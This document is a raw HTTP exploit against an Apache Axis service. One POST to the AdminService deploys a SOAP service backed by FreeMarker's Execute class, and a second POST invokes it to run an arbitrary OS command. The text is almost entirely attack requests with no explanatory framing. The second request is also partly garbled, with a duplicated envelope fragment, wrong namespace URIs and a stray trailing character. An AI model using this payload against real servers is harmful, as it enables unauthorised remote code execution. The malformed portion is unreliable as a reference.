

POST /services/AdminService;.do HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Content-Type: application/xml; charset=utf-8
Content-Length: 756
SOAPAction: ""

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Body>
        <ns1:deployment
            xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="freemarkerService" provider="java:RPC">
                <ns1:parameter name="className" value="freemarker.template.utility.Execute"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
        </ns1:deployment>
    </soapenv:Body>
</soapenv:Envelope>



POST  /services/freemarkerService

<soapenv:Envelope xmlns:xsi="http://www.w3.org/200/XMLSchema-instance" v:Envelope xmlns:xsi="http://www.w3.org/200/XMLSchema-instance" xmlns:xsd="http://www.w3.org/200/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">   <soapenv:Header/>   <soapenv:Body>      <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">         <arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">        <cmd xsi:type="soapenc:string">command</cmd>        </arguments>      </util:exec>   </soapenv:Body></soapenv:Envelope>0